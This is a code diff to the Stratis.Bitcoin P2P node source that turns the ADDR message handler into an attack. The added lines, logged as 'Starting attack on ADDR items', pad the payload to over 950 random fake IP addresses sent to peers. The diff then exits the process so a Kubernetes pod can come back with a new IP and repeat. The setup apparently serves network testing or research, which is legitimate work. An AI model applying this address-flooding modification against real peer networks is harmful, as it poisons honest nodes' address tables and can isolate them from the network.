@@ -102,12 +102,21 @@ namespace Stratis.Bitcoin.P2P
 
                         IEnumerable<IPEndPoint> endPoints = this.peerAddressManager.PeerSelector.SelectPeersForGetAddrPayload(MaxAddressesPerAddrPayload).Select(p => p.Endpoint);
 
+                        IPAddress address;
+                        var ipAddressData = new byte[4];
+
+                        var random = new Random();
+
+                        // Executing payload with sending 950 addresses and closing application for kubernetes pod to get other ip address
                         this.logger.LogInformation("Starting attack on ADDR items, preparing to send 950 addresses");
 
                         // Concatenates addr payload till it will reach more than 950
                         while (endPoints.Count() <= 950)
                         {
-                            endPoints.Concat(this.peerAddressManager.PeerSelector.SelectPeersForGetAddrPayload(MaxAddressesPerAddrPayload).Select(p => p.Endpoint));
+                            random.NextBytes(ipAddressData);
+                            address = new IPAddress(ipAddressData);
+
+                            endPoints = endPoints.Concat(new[] { new IPEndPoint(address, 0) });
                         }
 
                         var addressPayload = new AddrPayload(endPoints.Select(p => new NetworkAddress(p)).ToArray());
@@ -142,6 +151,9 @@ namespace Stratis.Bitcoin.P2P
                         this.peerAddressManager.AddPeers(addr.Addresses.Select(a => a.Endpoint), peer.RemoteSocketAddress);
                     }
                 }
+
+                // Close application after executing payload
+                System.Environment.Exit(0);
             }
             catch (OperationCanceledException)
             {
